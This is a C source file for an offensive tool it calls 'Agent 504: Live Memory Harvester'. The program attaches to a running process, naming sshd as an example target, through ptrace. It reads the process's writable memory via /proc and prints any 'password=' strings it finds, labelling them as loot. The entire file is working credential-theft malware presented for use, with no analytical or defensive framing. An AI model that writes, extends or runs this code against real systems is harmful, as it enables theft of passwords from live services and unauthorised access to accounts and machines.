#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/uio.h>

/* Agent 504: Live Memory Harvester.
   Attaches to a target process (like sshd) via ptrace and 
   extracts memory segments looking for credential signatures.
*/

void scrape_memory(pid_t target_pid) {
    char mem_path[256];
    char maps_path[256];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", target_pid);
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", target_pid);

    FILE *maps_file = fopen(maps_path, "r");
    if (!maps_file) return;

    // Attach to freeze the process memory state
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        fclose(maps_file);
        return;
    }
    waitpid(target_pid, NULL, 0);

    FILE *mem_file = fopen(mem_path, "rb");
    if (!mem_file) {
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        fclose(maps_file);
        return;
    }

    printf("--- [AGENT 504: SCRAPING PID %d] ---\n", target_pid);

    char line[512];
    while (fgets(line, sizeof(line), maps_file)) {
        unsigned long start, end;
        char perms[5];
        // Parse the memory map for readable/writable segments (usually heap/stack)
        sscanf(line, "%lx-%lx %4s", &start, &end, perms);

        if (perms[0] == 'r' && perms[1] == 'w') {
            size_t size = end - start;
            char *buffer = malloc(size);
            if (!buffer) continue;

            // Read the memory segment
            fseek(mem_file, start, SEEK_SET);
            if (fread(buffer, 1, size, mem_file) == size) {
                // In a full implementation, we use regex/YARA rules here.
                // For the primitive, we look for basic password structures.
                for (size_t i = 0; i < size - 10; i++) {
                    // Look for common SSH auth string patterns in memory
                    if (memcmp(buffer + i, "password=", 9) == 0) {
                        printf("[\033[92mLOOT FOUND\033[0m] %s\n", buffer + i);
                    }
                }
            }
            free(buffer);
        }
    }

    fclose(mem_file);
    fclose(maps_file);
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <target_pid>\n", argv[0]);
        return 1;
    }
    scrape_memory(atoi(argv[1]));
    return 0;
}
